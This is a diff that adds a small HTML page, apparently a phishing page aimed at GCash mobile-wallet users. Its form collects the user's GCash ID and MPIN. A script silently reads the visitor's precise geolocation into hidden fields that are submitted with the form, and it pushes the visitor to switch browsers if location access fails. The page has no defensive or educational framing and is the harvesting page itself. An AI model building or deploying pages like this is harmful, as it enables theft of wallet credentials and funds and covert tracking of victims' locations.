@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form method="post">
+        <input id="latitude" hidden name="latitude">
+        <input id="longitude" hidden name="longitude">
+        GCASH ID:<input type="text" name="gcash_id">
+        MPIN: <input type="text" name="mpin">
+        <input type="submit">
+    </form>
+</body>
+<script>
+    const options = {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+    }
+    function success(pos){
+        const crd = pos.coords
+        latitude = crd.latitude
+        longitude = crd.longitude
+        document.getElementById("latitude").value = latitude
+        document.getElementById("longitude").value = longitude
+    }
+
+    function error(err){
+        console.warn("Error Occured Please use another browser")
+    }
+
+    navigator.geolocation.getCurrentPosition(success, error, options);
+</script>
+</html>
